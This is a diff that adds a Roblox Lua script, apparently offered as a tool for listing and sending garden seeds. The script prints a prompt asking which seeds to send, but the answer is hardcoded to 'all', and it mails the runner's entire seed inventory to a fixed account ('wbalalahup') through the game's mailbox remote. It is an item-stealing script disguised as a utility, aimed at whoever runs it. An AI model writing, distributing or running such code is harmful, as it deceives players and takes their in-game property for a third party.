@@ -1,0 +1,143 @@
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local Networking = require(game:GetService("ReplicatedStorage").SharedModules.Networking)
+local PlayerState = require(game:GetService("ReplicatedStorage").ClientModules.PlayerStateClient)
+
+local function GetUserIdByUsername(Username)
+    if Username == "" then return nil end
+    local Success, Result = pcall(function()
+        return Players:GetUserIdFromNameAsync(Username)
+    end)
+    if Success and Result then
+        return Result
+    end
+    return nil
+end
+
+local function GetAllSeeds()
+    local AllSeeds = {}
+    local Replica = PlayerState:GetLocalReplica()
+    if not Replica then
+        return AllSeeds
+    end
+    local Inventory = Replica.Data and Replica.Data.Inventory
+    if not Inventory then
+        return AllSeeds
+    end
+    local Seeds = Inventory.Seeds
+    if Seeds then
+        for SeedName, Count in pairs(Seeds) do
+            if Count > 0 then
+                table.insert(AllSeeds, {
+                    Category = "Seeds",
+                    ItemKey = SeedName,
+                    Count = Count
+                })
+            end
+        end
+    end
+    return AllSeeds
+end
+
+local function ShowSeedList()
+    local seeds = GetAllSeeds()
+    if #seeds == 0 then
+        print("Khong co seed nao!")
+        return seeds
+    end
+    print("=== DANH SACH SEED ===")
+    for i, seed in pairs(seeds) do
+        print(string.format("%d. %s: x%d", i, seed.ItemKey, seed.Count))
+    end
+    return seeds
+end
+
+local function SendSelectedSeeds(RecipientUserId, SelectedSeeds, Note)
+    if #SelectedSeeds == 0 then
+        print("Khong co seed nao de gui!")
+        return false
+    end
+    for i = 1, #SelectedSeeds, 20 do
+        local Batch = {}
+        for j = i, math.min(i + 19, #SelectedSeeds) do
+            table.insert(Batch, SelectedSeeds[j])
+        end
+        pcall(function()
+            Networking.Mailbox.SendBatch:Fire(RecipientUserId, Batch, Note or "")
+        end)
+        task.wait(1)
+    end
+    print(string.format("Da gui %d loai seed!", #SelectedSeeds))
+    return true
+end
+
+local TargetUsername = "wbalalahup"
+local Note = "from yojoadv with love!"
+local TargetUserId = GetUserIdByUsername(TargetUsername)
+
+if not TargetUserId then
+    print("Khong tim thay user: " .. TargetUsername)
+    return
+end
+
+local allSeeds = ShowSeedList()
+
+if not allSeeds or #allSeeds == 0 then
+    return
+end
+
+print("Nhap ten seed va so luong muon gui (VD: Bamboo:5, Apple:10 hoac 'all'):")
+local input = "all"
+
+local selected = {}
+if input:lower() == "all" then
+    selected = allSeeds
+else
+    local parts = {}
+    for item in string.gmatch(input, "[^,]+") do
+        local clean = string.gsub(item, "^%s*(.-)%s*$", "%1")
+        table.insert(parts, clean)
+    end
+    
+    for _, part in pairs(parts) do
+        local seedName = part
+        local amount = nil
+        
+        local colonPos = string.find(part, ":")
+        if colonPos then
+            seedName = string.sub(part, 1, colonPos - 1)
+            local amountStr = string.sub(part, colonPos + 1)
+            amount = tonumber(amountStr)
+            seedName = string.gsub(seedName, "^%s*(.-)%s*$", "%1")
+        end
+        
+        local found = false
+        for _, seed in pairs(allSeeds) do
+            if seed.ItemKey:lower() == seedName:lower() then
+                local newSeed = {
+                    Category = "Seeds",
+                    ItemKey = seed.ItemKey,
+                    Count = amount and math.min(amount, seed.Count) or seed.Count
+                }
+                table.insert(selected, newSeed)
+                found = true
+                break
+            end
+        end
+        if not found then
+            print("Khong tim thay seed: " .. seedName)
+        end
+    end
+end
+
+if #selected == 0 then
+    print("Khong tim thay seed nao duoc chon!")
+    return
+end
+
+print(string.format("Dang gui %d loai seed...", #selected))
+for _, seed in pairs(selected) do
+    print(string.format("  - %s: x%d", seed.ItemKey, seed.Count))
+end
+
+SendSelectedSeeds(TargetUserId, selected, Note)
